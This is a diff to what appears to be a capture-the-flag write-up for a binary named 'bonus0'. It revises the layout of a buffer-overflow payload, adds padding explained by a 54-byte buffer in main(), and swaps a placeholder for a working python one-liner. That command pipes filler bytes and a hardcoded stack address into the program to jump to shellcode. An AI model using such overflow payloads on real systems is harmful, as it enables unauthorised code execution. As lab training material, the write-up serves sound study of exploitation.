@@ -69,13 +69,13 @@ Our payload must look like this
 
 |read #1|read #2|
 |-|-|
-|**4095** bytes + '\n'|**9** bytes offset + `shellcode address`|
+|**4095** bytes + '\n'|**9** bytes offset + `shellcode address` + **7** bytes of padding|
+
+The 7 bytes of padding are required since *output_string* in `main()` can store up to 54 bytes
 
 Now we have everything
 ```sh
-python -c "print '0' *4095 + '\n' + 'a'*9 + '//address//'" > /tmp/payload
-
-cat /tmp/payload - | ./bonus0
+(cat <(python -c "print '0' *4095 + '\n' + 'a'*9 + '\xa6\xf8\xff\xbf' + 'a' * 10") -) | ./bonus0
 ```
 
 
